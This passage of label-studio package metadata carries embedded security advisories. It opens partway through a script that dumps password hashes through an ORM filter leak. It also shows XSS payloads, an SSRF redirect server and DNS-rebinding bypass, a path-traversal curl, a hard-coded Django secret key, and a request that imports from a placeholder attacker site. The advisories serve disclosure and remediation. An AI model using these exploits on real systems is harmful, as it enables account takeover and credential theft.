PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.1.0rc0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.1.0rc0/","requires_dist":["wheel","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (==2.49.0)","boto3 (==1.16.28)","botocore (==1.19.28)","google-cloud-storage (==1.28.1)","Django (==3.1.12)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.3.2)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","django-redis-cache (==3.0.0)","drf-dynamic-fields (==0.3.0)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","label-studio-converter (==0.0.29)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","numpy (>=1.19.1)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.8.4)","pydantic (==1.7.3)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (<3,>=2.22.0)","rq (==1.7.0)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (>=3.5.0)","sentry-sdk (>=1.1.0)"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.1.0rc0","yanked":true,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"aa48de6b0b0c2a4f0626cf8d11397e0c7aacdfe964cdaa4d18db6aba940a2d36","md5":"f12f8c85f6e85310228bcde604de2aa4","sha256":"d121b972b77cfcd50711314310e2fd0be2702a3e52a99745072c75621e1a87a7"},"downloads":-1,"filename":"label_studio-1.1.0rc0-py3-none-any.whl","has_sig":false,"md5_digest":"f12f8c85f6e85310228bcde604de2aa4","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":46353646,"upload_time":"2021-06-30T17:50:30","upload_time_iso_8601":"2021-06-30T17:50:30.677673Z","url":"https://files.pythonhosted.org/packages/aa/48/de6b0b0c2a4f0626cf8d11397e0c7aacdfe964cdaa4d18db6aba940a2d36/label_studio-1.1.0rc0-py3-none-any.whl","yanked":true,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"414ddcfca6fa4a3fb967e97ac2c136af53d9d85acc5a454aa8d51f5ae299854b","md5":"38813c137214af2ee73bdfdc965260c2","sha256":"c9351ae40795986366875c504051e850fa5c71babff01c4c443ad9830178b570"},"downloads":-1,"filename":"label-studio-1.1.0rc0.tar.gz","has_sig":false,"md5_digest":"38813c137214af2ee73bdfdc965260c2","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":45896440,"upload_time":"2021-06-30T17:51:00","upload_time_iso_8601":"2021-06-30T17:51:00.811696Z","url":"https://files.pythonhosted.org/packages/41/4d/dcfca6fa4a3fb967e97ac2c136af53d9d85acc5a454aa8d51f5ae299854b/label-studio-1.1.0rc0.tar.gz","yanked":true,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom 